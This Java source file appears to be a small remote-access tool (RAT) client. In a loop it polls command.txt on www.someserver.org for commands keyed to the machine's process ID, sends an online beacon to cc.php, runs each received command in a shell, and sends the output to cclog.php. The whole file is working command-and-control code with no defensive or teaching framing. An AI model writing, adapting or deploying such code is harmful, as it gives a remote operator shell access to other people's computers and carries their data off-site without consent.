import java.lang.management.*;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.lang.Process.*;
import java.net.URLEncoder;


public class MainHandler {

    public static void main(String[] args) throws Exception{
        String id = ManagementFactory.getRuntimeMXBean().getName();
        // Create Machine ID so it can distinguish commands addressed to other Computers
        HTTP http = new HTTP();
        ExecCommand cmd = new ExecCommand();
        String command = null;
        String old;
        String OS = System.getProperty("os.name").toLowerCase();

        if(OS.indexOf("win") >=0 ){
            cmd.infoBox("Remote Access Started!");
        }

        
        System.out.println("Initializing Machine: ID = " + id);
        System.out.println("Listening");
        //System.out.println(cmd.executeCommand(command));
        while(true){
            Thread.sleep(1000);
            if(command != null) {
                old = command;
            }else {old = http.sendGet("http://www.someserver.org/Online/command.txt");}
            // Listen for command
            command = http.sendGet("http://www.someserver.org/Online/command.txt");
            
            // Send to server telling it is online
            http.sendGet("http://www.someserver.org/Online/cc.php?id="+id);
            
            // Check if it is a new command
            if(!command.contentEquals(old) && command.toLowerCase().contains(id.toLowerCase()+":")) {

                    String rlcommand = command.substring(command.indexOf(":")+1);
                    // Substring command to remove the machine ID in the command
                    
                    System.out.println("New Command: " + rlcommand);
                    if (rlcommand.contentEquals("shutdown")) {
                    
                        System.exit(1);
                        System.out.println("Attempted to Shutdown");
                        
                    } else if (rlcommand.contentEquals("play")) {
                        // Any new command
                    } else {
                        String resp = cmd.executeCommand(rlcommand);
                        // Execute shell command
                        resp = java.net.URLEncoder.encode(resp, "UTF-8").replace("+", "%20");
                        resp = resp.replace("%0A", "~.~");
                        // Encode so it can be sent via HTTP
                        
                        // Send the Response of the shell execution
                        System.out.println(http.sendGet("http://www.someserver.org/Online/cclog.php?resp=" + resp));
                        System.out.println(resp);
                }
            }
        }
    }
}
